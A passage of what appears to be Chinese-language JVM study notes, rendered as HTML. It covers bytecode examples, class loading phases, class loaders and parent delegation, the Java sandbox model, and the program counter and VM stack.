&lt;java/lang/Integer.valueOf : (I)Ljava/lang/Integer;&gt;</span></span><br><span class="line"><span class="comment">     *  6 astore_1      对象引用插入局部变量表下标1的位置</span></span><br><span class="line"><span class="comment">     *  7 sipush 128    操作数栈顶插入128</span></span><br><span class="line"><span class="comment">     * 10 istore_2      拿出操作数栈顶元素，插入局部变量表下标2位置</span></span><br><span class="line"><span class="comment">     * 11 getstatic #2 &lt;java/lang/System.out : Ljava/io/PrintStream;&gt;</span></span><br><span class="line"><span class="comment">     * 14 aload_1       操作数栈顶插入局部变量表下标1位置保存的引用</span></span><br><span class="line"><span class="comment">     * 15 invokevirtual #16 &lt;java/lang/Integer.intValue : ()I&gt;  操作数栈顶元素调用Integer.intValue（拆箱）</span></span><br><span class="line"><span class="comment">     * 18 iload_2</span></span><br><span class="line"><span class="comment">     * 19 if_icmpne 26 (+7)     比较</span></span><br><span class="line"><span class="comment">     * 22 iconst_1</span></span><br><span class="line"><span class="comment">     * 23 goto 27 (+4)</span></span><br><span class="line"><span class="comment">     * 26 iconst_0</span></span><br><span class="line"><span class="comment">     * 27 invokevirtual #5 &lt;java/io/PrintStream.println : (Z)V&gt;</span></span><br><span class="line"><span class="comment">     * 30 return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test7</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">        System.out.println(i1 == i2);   <span class="comment">// true，根据字节码显示：拆箱再比较</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="2）案例二"><a href="#2）案例二" class="headerlink" title="2）案例二"></a>2）案例二</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.print();</span><br><span class="line">        n = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;A.n = &quot;</span> + n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">B</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.print();</span><br><span class="line">        n = <span class="number">20</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;B.n = &quot;</span> + n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * B.n = 0</span></span><br><span class="line"><span class="comment"> * B.n = 10</span></span><br><span class="line"><span class="comment"> * 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">    System.out.println(a.n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-类的加载"><a href="#2-类的加载" class="headerlink" title="2. 类的加载"></a>2. 类的加载</h1><h2 id="2-1-加载过程"><a href="#2-1-加载过程" class="headerlink" title="2.1 加载过程"></a>2.1 加载过程</h2><h3 id="2-1-1-加载-Loading"><a href="#2-1-1-加载-Loading" class="headerlink" title="2.1.1 加载(Loading)"></a>2.1.1 加载(Loading)</h3><p>加载的对象：基本数据类型由虚拟机预先定义，引用数据类型需要进行类加载。</p>
<p>加载完成3件事：</p>
<ol>
<li>通过类的全名来获取类的二进制数据流。</li>
<li>解析类的二进制数据流为方法区的运行时数据结构。</li>
<li>在内存中生成代表这个类的java.lang.Class对象（类模板对象），作为方法区这个类的各种数据的访问入口。</li>
</ol>
<p>目的：简单来说，就是加载类的字节码到方法区（JDK 8之前永久代，JDK 8及之后元空间），并在堆中生成代表这个类的Class对象。存储在方法区的数据为类的元数据（instanceKlass对象），包括类型信息、方法信息、字段信息等；存储在堆中的是类的Class对象，作为访问类的元数据的入口。</p>
<p>类模板对象获取方式：类.class、类实例.getClass()、Class.forName(“类的全名”)。</p>
<p>数组类的加载有所不同，数组类本身不通过类加载器创建，它是由JVM直接在内存中动态构造出来的，但数组元素类型仍然需要类加载器进行加载，遵循如下规则：</p>
<ol>
<li>若数组的组件类型（去掉一个维度的类型）为引用类型，则递归采用类加载过程进行加载。数组类将被标识在加载该组件类型的类加载器的类名称空间上。</li>
<li>若数组的组件类型不是引用类型，JVM会将数组类与引导类加载器关联。</li>
<li>数组类的可访问性与它的组件类型的可访问性一致，若组件类型不是引用类型，数组类的可访问性为public。</li>
</ol>
<p>同一个类，只会被同一个类加载器加载一次，但可以通过不同类加载器进行多次加载。</p>
<h3 id="2-1-2-链接-Linking"><a href="#2-1-2-链接-Linking" class="headerlink" title="2.1.2 链接(Linking)"></a>2.1.2 链接(Linking)</h3><h4 id="1）验证-Verification"><a href="#1）验证-Verification" class="headerlink" title="1）验证(Verification)"></a>1）验证(Verification)</h4><p>验证阶段大致上会完成下面四个阶段的检验动作：</p>
<ol>
<li>文件格式验证：魔数、版本等。</li>
<li>元数据验证：是否有父类、是否继承了final类等。</li>
<li>字节码验证：保证任意时刻操作数栈的数据类型与指令代码序列都能配合工作、保证任何跳转指令都不会跳转到方法体以外的字节码指令上等。</li>
<li>符号引用验证：验证符号引用指向的类、方法、字段等资源是否存在。</li>
</ol>
<p>目的：保证字节码是合法、合理并符合规范的。</p>
<h4 id="2）准备-Preparation"><a href="#2）准备-Preparation" class="headerlink" title="2）准备(Preparation)"></a>2）准备(Preparation)</h4><p>目的：为类的静态变量分配内存，并初始化为默认值。</p>
<p>注意：静态变量指的是static、非final修饰的变量（也即类变量），值为字面量的静态常量（static final）在准备阶段分配内存并赋值；这个阶段不会有代码执行，真正的赋值操作在初始化阶段，通过<code>&lt;clinit&gt;()</code>方法执行。JVM各类型默认初始值如下表：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>默认值</th>
</tr>
</thead>
<tbody><tr>
<td>byte</td>
<td>(byte)0</td>
</tr>
<tr>
<td>short</td>
<td>(short)0</td>
</tr>
<tr>
<td>int</td>
<td>0</td>
</tr>
<tr>
<td>long</td>
<td>0L</td>
</tr>
<tr>
<td>float</td>
<td>0.0f</td>
</tr>
<tr>
<td>double</td>
<td>0.0d</td>
</tr>
<tr>
<td>char</td>
<td>‘\u0000’</td>
</tr>
<tr>
<td>boolean</td>
<td>false（Java内部通过int实现，默认值为0，因此默认false）</td>
</tr>
<tr>
<td>reference</td>
<td>null</td>
</tr>
</tbody></table>
<h4 id="3）解析-Resolution"><a href="#3）解析-Resolution" class="headerlink" title="3）解析(Resolution)"></a>3）解析(Resolution)</h4><p>目的：将类、接口、字段、方法的符号引用转为直接引用。</p>
<p>加载、验证、准备、初始化和卸载这五个阶段的顺序是确定的，而解析阶段则不一定，它在某些情况下可以在初始化阶段之后再开始， 这是为了支持Java语言的运行时绑定特性（也称为动态绑定或晚期绑定）。</p>
<h3 id="2-1-3-初始化-Initialization"><a href="#2-1-3-初始化-Initialization" class="headerlink" title="2.1.3 初始化(Initialization)"></a>2.1.3 初始化(Initialization)</h3><p>目的：通过执行类构造器<code>&lt;clinit&gt;()</code>方法，对静态变量进行赋值。</p>
<p><code>&lt;clinit&gt;()</code>方法：编译器自动收集类中的所有类变量的赋值动作和静态代码块中的语句合并产生。如果没有类变量或静态代码块赋值，则不会产生该方法。执行子类的<code>&lt;clinit&gt;()</code>之前，会先执行父类的<code>&lt;clinit&gt;()</code>，因此父类静态代码块先于子类静态代码块执行。</p>
<p><code>&lt;init&gt;()</code>方法：一定会出现在Class的method表中。</p>
<p>不会产生<code>&lt;clinit&gt;()</code>方法的情况：</p>
<ol>
<li>类中没有静态变量，也没有静态代码块；</li>
<li>类中有静态变量，但无显式赋值；</li>
<li>类中只有静态常量，且其值为字面量；若其值为方法的执行结果，则会产生<code>&lt;clinit&gt;()</code>方法。</li>
</ol>
<p><code>&lt;clinit&gt;()</code>方法加锁，线程安全，演示类加载死锁的代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(<span class="string">&quot;com.zhifei.A&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(<span class="string">&quot;com.zhifei.B&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.MILLISECONDS.sleep(<span class="number">500</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.zhifei.B&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;A.static initializer&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.MILLISECONDS.sleep(<span class="number">500</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.zhifei.A&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;B.static initializer&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会进行类的初始化的情况（主动使用，有<code>&lt;clinit&gt;()</code>方法的调用）：</p>
<ol>
<li>通过new创建对象。（new）</li>
<li>使用静态变量（值为字面量的常量除外）。（getstatic、putstatic）</li>
<li>调用静态方法。（invokestatic）</li>
<li>使用java.lang.reflect包的方法对类型进行反射调用的时候，如果类型没有进行过初始化，则需要先触发其初始化。</li>
<li>当初始化类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化。</li>
<li>当虚拟机启动时，用户需要指定一个要执行的主类（包含main()方法的那个类），虚拟机会先初始化这个主类。</li>
<li>当使用JDK 7新加入的动态语言支持时，如果一个java.lang.invoke.MethodHandle实例最后的解析结果为REF_getStatic、REF_putStatic、REF_invokeStatic、REF_newInvokeSpecial四种类型的方法句柄，并且这个方法句柄对应的类没有进行过初始化，则需要先触发其初始化。</li>
<li>当一个接口中定义了JDK 8新加入的默认方法（被default关键字修饰的接口方法）时，如果有这个接口的实现类发生了初始化，那该接口要在其之前被初始化。</li>
</ol>
<p>不会进行类的初始化的情况（被动使用，没有<code>&lt;clinit&gt;()</code>方法的调用）：</p>
<ol>
<li>子类引用父类的静态字段，不会导致子类初始化。</li>
<li>通过数组定义来引用类，不会触发此类的初始化。</li>
<li>引用常量不会触发该类或接口的初始化。其在链接的准备阶段已经完成赋值。</li>
<li>通过ClassLoader的loadClass()加载类，不会触发类的初始化。</li>
</ol>
<p>测试题：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tst</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tst</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tst</span>(<span class="string">&quot;t1&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Tst</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tst</span>(<span class="string">&quot;t2&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> print(<span class="string">&quot;i&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        print(<span class="string">&quot;non-static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> print(<span class="string">&quot;j&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        print(<span class="string">&quot;static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Tst</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        System.out.println((k++) + <span class="string">&quot; - &quot;</span> + str + <span class="string">&quot; i=&quot;</span> + (++i) + <span class="string">&quot; n=&quot;</span> + (n++));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">print</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        System.out.println((k++) + <span class="string">&quot; - &quot;</span> + str + <span class="string">&quot; i=&quot;</span> + (++i) + <span class="string">&quot; n=&quot;</span> + (n++));</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 11 - non-static i=1 n=0</span></span><br><span class="line"><span class="comment">     * 12 - j i=2 n=1</span></span><br><span class="line"><span class="comment">     * 13 - t1 i=3 n=2</span></span><br><span class="line"><span class="comment">     * 14 - non-static i=4 n=3</span></span><br><span class="line"><span class="comment">     * 15 - j i=5 n=4</span></span><br><span class="line"><span class="comment">     * 16 - t2 i=6 n=5</span></span><br><span class="line"><span class="comment">     * 17 - i i=7 n=6</span></span><br><span class="line"><span class="comment">     * 18 - static i=8 n=20</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-1-4-使用-Using"><a href="#2-1-4-使用-Using" class="headerlink" title="2.1.4 使用(Using)"></a>2.1.4 使用(Using)</h3><h3 id="2-1-5-卸载-Unloading"><a href="#2-1-5-卸载-Unloading" class="headerlink" title="2.1.5 卸载(Unloading)"></a>2.1.5 卸载(Unloading)</h3><p>前言：每个类加载器持有其加载所有类的集合，同理，Class对象持有加载该类的类加载器，类加载器与Class对象是双向关联的关系。任一个对象持有其Class对象的引用（class属性）。</p>
<p>因此，要想卸载类：</p>
<ol>
<li>类加载器置为null。（不只有一个类被该加载器加载的情况，不建议置为null，只适合自定义的单一类被该类加载器加载的情况。）</li>
<li>所有实例置为null。</li>
<li>引用其class的变量置为null。</li>
</ol>
<p>故，已经加载的类被卸载的几率极低，开发过程中，也不应该去卸载。</p>
<h2 id="2-2-类加载器"><a href="#2-2-类加载器" class="headerlink" title="2.2 类加载器"></a>2.2 类加载器</h2><h3 id="2-2-1-分类"><a href="#2-2-1-分类" class="headerlink" title="2.2.1 分类"></a>2.2.1 分类</h3><ol>
<li><p>启动类加载器（引导类加载器，BootStrap）</p>
<p>1）使用C&#x2F;C++语言实现，嵌套在JVM内部。</p>
<p>2）不继承java.lang.ClassLoader，没有父类加载器。</p>
<p>3）加载Java的核心库（jre&#x2F;lib&#x2F;rt.jar、sun.boot.class.path下类库）。</p>
<p>4）出于安全考虑，只加载包名以java、javax、sun等开头的类。</p>
<p>5）加载扩展类加载器和应用程序类加载器，并指定为它们的父类加载器。</p>
</li>
<li><p>扩展类加载器（ExtClassLoader）</p>
<p>1）Java语言编写，由sun.misc.Launcher$ExtClassLoader实现。</p>
<p>2）继承java.lang.ClassLoader，父类加载器为启动类加载器。</p>
<p>3）加载jre&#x2F;lib&#x2F;ext目录下的类库或系统变量java.ext.dirs指定目录下的类库。</p>
</li>
<li><p>应用程序类加载器（系统类加载器，AppClassLoader）</p>
<p>1）Java语言编写，由sun.misc.Launcher$AppClassLoader实现。</p>
<p>2）继承java.lang.ClassLoader，父类加载器为扩展类加载器。</p>
<p>3）加载用户类路径classpath所有的类库或系统变量java.class.path指定目录下的类库。</p>
<p>4）它是应用程序中默认的类加载器，也是自定义类加载器的默认父类加载器。</p>
<p>5）可通过ClassLoader的getSystemClassLoader()获取。</p>
</li>
<li><p>自定义加载器（继承ClassLoader），可实现：隔离加载类（同一个tomcat不同应用的程序）、修改类加载方式、扩展加载源（数据库、网络）、防止源码泄露（还原加密的字节码）。</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取指定类的类加载器</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> A.class.getClassLoader();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前线程上下文的类加载器</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">ccl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取系统类加载器</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">scl</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br></pre></td></tr></table></figure>

<p>自定义类加载器源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CuzClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String rootPath;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CuzClassLoader</span><span class="params">(String rootPath)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.rootPath = rootPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) &#123;</span><br><span class="line">        <span class="comment">// 转换为文件路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> classNameToFilePath(name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取字节码的二进制流</span></span><br><span class="line">        <span class="type">byte</span>[] data = loadFromFilePath(filePath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用defineClass()，其下调用了preDefineClass()，对java.开头的类库进行了保护，即不能通过自定义的类加载器进行加载。</span></span><br><span class="line">        <span class="keyword">return</span> defineClass(name, data, <span class="number">0</span>, data.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] loadFromFilePath(String filePath) &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> (</span><br><span class="line">                <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((len = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            data = baos.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">classNameToFilePath</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> rootPath + <span class="string">&quot;/&quot;</span> + name.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CuzClassLoader</span> <span class="variable">ccl1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CuzClassLoader</span>(<span class="string">&quot;D:\\codes\\juc-jvm-demo\\src\\main\\java&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; clz1 = ccl1.findClass(<span class="string">&quot;com.zhifei.CuzClassLoaderByte&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CuzClassLoader</span> <span class="variable">ccl2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CuzClassLoader</span>(<span class="string">&quot;D:\\codes\\juc-jvm-demo\\src\\main\\java&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; clz2 = ccl2.findClass(<span class="string">&quot;com.zhifei.CuzClassLoaderByte&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;clz1 == clz2 ? &quot;</span> + (clz1 == clz2));</span><br><span class="line">        clz1.newInstance();</span><br><span class="line">        clz2.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-2-特征"><a href="#2-2-2-特征" class="headerlink" title="2.2.2 特征"></a>2.2.2 特征</h3><ol>
<li>双亲委派机制：一个类的加载会先委派给父类加载器加载，父类加载器也是如此，所以先由Bootstrap加载，如果无法加载，再由ExtClassLoader加载，如果再加载不了，则由AppClassLoader加载。优点：避免类重复加载；保护核心类库。缺点：顶层的类加载器不能访问底层的类加载器。</li>
<li>可见性：子类加载器可以访问父类加载器加载的类型，反过来不允许。</li>
<li>单一性：父类加载器加载后，子类加载器不会重复加载。但类加载器”邻居“间，同一类型可以被加载多次，其相互间不可见。</li>
</ol>
<hr>
<p>破坏双亲委派机制：</p>
<p>第一次破坏：由于双亲委派模型在JDK 1.2之后才被引入，但是类加载器的概念和抽象类java.lang.ClassLoader则在Java的第一个版本中就已经存在，无法再以技术手段避免loadClass()被子类覆盖的可能性，只能在JDK 1.2之后的java.lang.ClassLoader中添加一个新的protected方法findClass()，并引导用户编写的类加载逻辑时尽可能去重写这个方法，而不是在loadClass()中编写代码。</p>
<p>第二次破坏：顶层的类加载器不能访问底层的类加载器。线程上下文类加载器（Thread Context ClassLoader）。这个类加载器可以通过java.lang.Thread类的setContext-ClassLoader()方法进行设置，如果创建线程时还未设置，它将会从父线程中继承一个，如果在应用程序的全局范围内都没有设置过的话，那这个类加载器默认就是应用程序类加载器。</p>
<p>第三次破坏：用户对程序动态性的追求而导致的，这里所说的“动态性”指的是一些非常“热”门的名词：代码热替换（Hot Swap）、模块热部署（Hot Deployment）等。</p>
<p>另外，Tomcat的自定义类加载器破坏了双亲委派机制，其解决了：</p>
<ol>
<li>同一个Web容器，多个应用程序类库独立，相互隔离。</li>
<li>同一个Web容器，多个应用程序间相同版本的类库共享。</li>
<li>Web容器自身类库与应用程序类库相互隔离。</li>
<li>支持jsp热部署。</li>
</ol>
<hr>
<p>沙箱机制就是将Java代码限定只能在虚JVM虚拟机中特定的运行范围，并且严格限制代码对本地系统资源访问，通过这样的方式来保证对Java代码的有效隔离，防止对本地操作系统造成破坏。主要限制系统资源（CPU、内存、文件系统、网络）的访问。</p>
<ul>
<li>JDK 1.0安全模型本地代码可以访问系统资源，远程代码无法访问系统资源，比如用户希望远程代码访问本地系统的文件时候，就无法实现。</li>
<li>JDK 1.1安全模型版本中，针对安全机制做了改进，增加了受信任安全策略，允许用户指定代码对本地资源的访问权限。</li>
<li>JDK 1.2安全模型改进了安全机制，增加了代码签名。不论本地代码或是远程代码，统一按照用户的安全策略设定，由类加载器加载到虚拟机中权限不同的运行空间，从而来实现差异化的代码执行权限控制。</li>
<li>目前最新的安全模型引入了域(Domain)的概念。JVM虚拟机会把所有代码加载到不同的系统域和应用域，系统域部分专门负责与关键资源系统进行交互，而每个应用域部分则通过系统域的部分代理来对各种需要的资源进行精细划分然后可以进行访问。JVM虚拟机中不同的受保护域(Protected Domain)对应不一样的权限(Permission)。存在于不同域中的类文件就拥有了它所包含应用域所有可访问资源之和。</li>
</ul>
<h1 id="3-运行时数据区"><a href="#3-运行时数据区" class="headerlink" title="3. 运行时数据区"></a>3. 运行时数据区</h1><h2 id="3-1-程序计数器"><a href="#3-1-程序计数器" class="headerlink" title="3.1 程序计数器"></a>3.1 程序计数器</h2><p>​		程序计数器是当前线程所执行的字节码的行号指示器（存储当前线程所执行的字节码指令地址），字节码解释器通过改变计数器的值来选取下一条要执行的字节码指令。它是程序控制流的指示器，分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖这个计数器来完成。</p>
<p>​		若线程正在执行的是Java方法，计数器记录的是正在执行的虚拟机字节码指令地址；若正在执行的是本地（Native）方法，计数器的值为空（Undefined），本地方法大多通过C实现，未编译成字节码指令，所以计数器为空。</p>
<p>线程私有的原因：Java虚拟机的多线程是通过线程轮流切换、分配处理器执行时间的方式来实现的，为了保证线程切换后能恢复到正确的执行位置。</p>
<h3 id="3-1-1-特点"><a href="#3-1-1-特点" class="headerlink" title="3.1.1 特点"></a>3.1.1 特点</h3><ol>
<li>线程私有，生命周期与线程的一致。</li>
<li>不存在GC，不存在OOM。</li>
<li>内存小，运行速度在运行时数据区中最快。</li>
</ol>
<h2 id="3-2-虚拟机栈"><a href="#3-2-虚拟机栈" class="headerlink" title="3.2 虚拟机栈"></a>3.2 虚拟机栈</h2><p>​		每个方法被执行的时候，Java虚拟机都会同步创建一个栈帧（Stack Frame）用于存储局部变量表、操作数栈、动态链接、方法出口等信息。每一个方法被调用直至执行完毕的过程，就对应着一个栈帧在虚拟机栈中从入栈到出栈的过程。栈顶元素对应正在执行的方法，方法正常退出或异常退出，栈顶元素都被移除。</p>
